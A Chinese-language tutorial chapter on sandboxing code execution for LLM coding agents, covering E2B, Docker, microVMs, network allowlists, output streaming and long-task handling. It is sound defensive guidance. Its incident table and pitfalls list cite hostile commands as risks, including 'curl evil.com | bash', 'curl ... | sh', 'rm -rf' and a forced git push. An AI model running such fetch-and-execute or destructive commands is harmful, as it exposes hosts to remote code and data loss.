# 05 · 代码执行沙箱

让 LLM 跑代码 = 让一个**有时会撒谎、有时会幻觉、永远不知道命令副作用**的实体在你的机器上有 shell 权限。**没有沙箱的 Coding Agent 不应该上线**。本章把沙箱选型、隔离层级、stdout 流式、长任务策略、跨语言支持讲透。

## 1. 为什么必须沙箱

真实事故清单（绝大多数都发生过）：

| 事故 | 原因 |
| --- | --- |
| `rm -rf` 删用户文件 | LLM 误以为是临时目录 |
| `git push --force` 覆盖远端 | LLM 没读懂 git 状态 |
| 调用付费 API 烧钱 | LLM 在循环里反复重试 |
| 写穿宿主机网络 | LLM 跑爬虫被风控封 IP |
| 装恶意 npm 包 | 依赖投毒 |
| `curl ... | sh` | LLM 复制网上的脚本 |
| 大文件读到内存 OOM | LLM 处理 20GB log |
| 死循环占满 CPU | 无超时控制 |

每条都可以通过沙箱兜住，**且只需一次配置**。

## 2. 选型矩阵

| 方案 | 启动速度 | 隔离强度 | 单实例成本 | 持久化 | 网络控制 | 适合 |
| --- | --- | --- | --- | --- | --- | --- |
| 子进程 + 限权用户 | 即时 | 弱 | $0 | 是 | 弱 | 个人玩具 |
| Docker 容器 | 1–3s | 中 | 低 | volume | 中 | 本地 dev、CI |
| Devcontainer | 同上 | 中 | 低 | 是 | 中 | IDE 集成（VS Code）|
| Firecracker microVM | 100–300ms | 强 | 中 | 镜像 | 强 | 云端规模化 |
| gVisor | 1–3s | 强 | 低 | 是 | 强 | 多租户 |
| **E2B** | <500ms | 强（基于 Firecracker）| 按时间计费 | 持久会话 | 白名单 | SaaS Coding Agent 首选 |
| **Modal** | 1–3s | 强 | 按时间计费 | volume / dict | 强 | 后端任务、批处理 |
| **Daytona** | 1–3s | 中 | 自部署 | 是 | 中 | 自托管开源 |
| 浏览器 WebContainer | 即时 | 沙箱（无 Docker）| $0 | localStorage | 无后端 | 纯前端 demo（StackBlitz / Bolt）|

**速判结论**：

- 自己玩 → Docker。
- SaaS Coding Agent → **E2B 或 Modal**（这俩就是为这个场景做的）。
- 多租户、合规要求高 → Firecracker / gVisor 自建。
- 浏览器内不出云 → WebContainer（v0、Bolt、Lovable 用这个）。

## 3. E2B 最小例子

[E2B](https://e2b.dev/) 是 Coding Agent 沙箱的**事实标准之一**——OpenHands、Cline、Cursor Background Agent 都接了。

```python
"""
E2B 最小沙箱：跑用户代码 + 读 stdout/stderr。
依赖：pip install e2b-code-interpreter
环境：export E2B_API_KEY=...
"""
from e2b_code_interpreter import Sandbox

with Sandbox.create() as sbx:
    # 写文件
    sbx.files.write("/home/user/app.py", "print('hello'); 1/0")
    # 跑命令
    res = sbx.commands.run("python /home/user/app.py", timeout=10)
    print("STDOUT:", res.stdout)
    print("STDERR:", res.stderr)
    print("EXIT:", res.exit_code)

    # 也可以直接执行 Python，拿到富输出（图、df）
    exec_res = sbx.run_code("import pandas as pd; pd.DataFrame({'a':[1,2]})")
    for r in exec_res.results:
        print(r.text)
```

**关键能力**：

- 持久会话（`Sandbox.connect(sandbox_id)`）→ 多轮 agent 共享一个文件系统。
- 流式 stdout（用 `on_stdout` 回调）→ 边跑边送回 LLM。
- 文件上传 / 下载 → 把仓库 mount 进去。
- Computer Use（带屏幕 + 鼠标）→ 跑 GUI。

## 4. Docker / Devcontainer 自托管

不想付云费用？**Docker 完全够用**。一个最小 Coding Agent dockerfile：

```dockerfile
FROM python:3.12-slim
RUN apt-get update && apt-get install -y --no-install-recommends \
    git ripgrep build-essential curl && rm -rf /var/lib/apt/lists/*
RUN useradd -m -s /bin/bash agent
USER agent
WORKDIR /home/agent/work
```

Python 端用 `docker` SDK 启容器、塞代码、跑命令、收 stdout：

```python
"""
Docker 沙箱：每个 agent 任务一个一次性容器。
依赖：pip install docker
"""
import docker, tarfile, io

client = docker.from_env()

def run_in_sandbox(repo_dir: str, cmd: str, timeout: int = 30) -> dict:
    container = client.containers.run(
        image="my-agent-sandbox:latest",
        command="sleep infinity",
        detach=True,
        network_mode="bridge",   # 或 "none" 完全断网
        mem_limit="1g",
        cpu_quota=100_000,        # 1 CPU
        read_only=False,
        tmpfs={"/tmp": ""},
    )
    try:
        # 把 repo 拷进容器
        buf = io.BytesIO()
        with tarfile.open(fileobj=buf, mode="w") as tar:
            tar.add(repo_dir, arcname="work")
        buf.seek(0)
        container.put_archive("/home/agent", buf)
        # 跑命令
        ec, out = container.exec_run(
            cmd, workdir="/home/agent/work", demux=True,
        )
        stdout, stderr = out
        return {
            "exit": ec,
            "stdout": (stdout or b"").decode(errors="ignore"),
            "stderr": (stderr or b"").decode(errors="ignore"),
        }
    finally:
        container.kill()
        container.remove()

if __name__ == "__main__":
    print(run_in_sandbox(".", "python -c 'print(2+2)'"))
```

**Devcontainer**（`.devcontainer/devcontainer.json`）让"Cursor / VS Code 内 Agent 用同一套环境跑"，避免"我本机过 CI 不过"的差异。

## 5. 文件系统隔离 + 网络白名单

| 隔离维度 | Docker | E2B | Modal |
| --- | --- | --- | --- |
| FS 写宿主 | volume mount 控制 | 不可（独立 microVM）| 不可 |
| 网络出站 | iptables / `--network none` | 域名白名单 | egress proxy |
| 资源上限 | `--memory --cpus` | 配置 | 自动 scale |
| `/etc/passwd` 隔离 | 是（容器内）| 是 | 是 |
| Capabilities | `--cap-drop=ALL` 强烈推荐 | 默认最小 | 默认最小 |

**网络白名单是 Coding Agent 的高 ROI 配置**：

- 允许 `pypi.org`、`registry.npmjs.org`、`github.com`、自家 API。
- 拒绝其它一切（防爬虫、防外发）。

E2B / Modal 默认提供白名单 API；Docker 自托管要自己 iptables 或 squid proxy。

## 6. Stdout / Stderr 流式回 LLM

长跑命令（编译、测试）必须**边跑边送 LLM**，否则用户卡 30 秒看不到任何反馈。

| 模式 | 实现 |
| --- | --- |
| 阻塞拿全量 | `subprocess.run(..., capture_output=True)` |
| 流式回调 | `Popen` + `readline` 循环 + 推到 LLM streaming chunks |
| 增量 tail | 把 stdout 写入文件，LLM 工具 `read_log(offset)` |

**Claude Code 做法**：长命令拆 `Bash(timeout=120s)` + `BashOutput(bash_id)`——LLM 主动 poll 输出，不阻塞主对话。**OpenHands 做法**：内置 streaming runtime，stdout 直接进 chat。

## 7. 长任务（30s+）策略

跑 `npm install`、`pytest -x` 这类 30 秒 ~ 几分钟的命令：

| 策略 | 说明 |
| --- | --- |
| 硬超时 | 设 `timeout=300`，过了就杀 |
| 软超时 + 提示 | 60s 没退出 → 提示 LLM "command still running, continue or kill?" |
| 后台 + Poll | 把命令放 `&` 后台，LLM 用工具查状态 |
| Tail-only | 只把最后 N KB 输出回 LLM（避免 token 爆炸）|
| 进度抽样 | 每 10s 截 stdout 末尾 200 行 |

**Cursor Background Agent / Claude Code 后台模式**：所有长命令默认走后台 + tail，主对话不卡。

## 8. 跨语言执行

| 语言 | 沙箱镜像 | 关键工具 |
| --- | --- | --- |
| Python | `python:3.12` | venv / poetry / uv |
| Node | `node:20` | npm / pnpm / bun |
| Rust | `rust:1.80` | cargo（编译慢，预热缓存）|
| Go | `golang:1.22` | go test |
| Java | `eclipse-temurin:21` | maven / gradle |
| C/C++ | `gcc:13` | cmake |
| 多语言 monorepo | 自己 build "kitchen sink" 镜像 | nix / asdf 管多版本 |

**优化**：Rust / Java 编译慢——**预热依赖缓存**作为 base image 层（`cargo fetch`、`mvn dependency:go-offline` 跑过一次）。

## 9. 与 Agent 工具系统衔接

沙箱在 Agent 的工具列表里通常长这样（看 [../agents/04-tool-use.md](../agents/04-tool-use.md) §6）：

| 工具 | 输入 | 输出 |
| --- | --- | --- |
| `bash(cmd, timeout)` | shell 命令 | stdout / stderr / exit |
| `bash_background(cmd)` | 同上 | bash_id |
| `bash_output(bash_id)` | 后台 id | tail 输出 |
| `read_file(path)` | 路径 | 内容 |
| `write_file(path, content)` | 路径+内容 | OK/Err |
| `str_replace(path, old, new)` | 路径+片段 | OK/Err |
| `apply_patch(diff)` | unified diff | OK/Err |

Anthropic 的 `bash_20250124` + `text_editor_20250124` 工具规范是当前的事实标准——直接抄。

## 常见坑

1. **裸跑 LLM 命令**：哪怕本地 dev 也至少 docker 包一层。**别赌"反正是我的电脑"**。
2. **沙箱内 `git push`**：错误地把生产 git 凭据塞沙箱 → LLM 一句 push 把分支毁了。**禁用 push、禁用 GH token**。
3. **网络全开**：LLM 心血来潮 `curl evil.com | bash`。**白名单**。
4. **stdout 不限大小**：LLM 把 20MB log 全收回去 → token 爆炸 → API 超限报错。**tail + 截断**。
5. **没 CPU/内存上限**：`while True: x.append(1)` 把宿主机吃满。**`--memory --cpus` 必填**。
6. **共享会话 = 共享污染**：A 用户 sandbox 没清就给 B 用户复用，**残留文件 / 进程**。每任务独立或显式 reset。
7. **冷启动 30 秒**：Firecracker / E2B 是为热启动设计的，自建 Docker 一次性容器若不预热，每次新建拖慢用户体验。**保活池**。
8. **依赖装到全局**：LLM 跑 `pip install -g foo` 影响后续任务。**永远 venv / 临时容器**。

## 下一步

- 把沙箱接进 Agent 工具规范 → [../agents/04-tool-use.md](../agents/04-tool-use.md) §6。
- 长任务的 Agent 状态机 → [../langgraph/04-control-flow.md](../langgraph/04-control-flow.md)。
- 沙箱里跑测试做调试 → [07 · 调试 Agent](./07-debug.md)。
- E2B 文档：<https://e2b.dev/docs>；Modal：<https://modal.com/docs>；OpenHands runtime：<https://docs.all-hands.dev>.
